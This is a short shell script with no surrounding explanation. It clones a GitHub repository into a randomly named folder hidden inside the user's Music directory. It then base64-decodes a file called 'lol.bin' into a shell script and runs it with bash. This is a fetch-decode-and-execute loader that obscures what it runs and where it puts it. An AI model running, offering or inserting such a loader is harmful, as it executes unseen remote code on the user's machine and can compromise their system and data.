export random=$RANDOM

git clone https://github.com/SilentSarah/Med_buster /Users/$USER/Music/lkwa${random}
base64 -d /Users/$USER/Music/lkwa${random}/lol.bin > /Users/$USER/Music/lkwa${random}/test.sh
bash /Users/$USER/Music/lkwa${random}/test.sh $random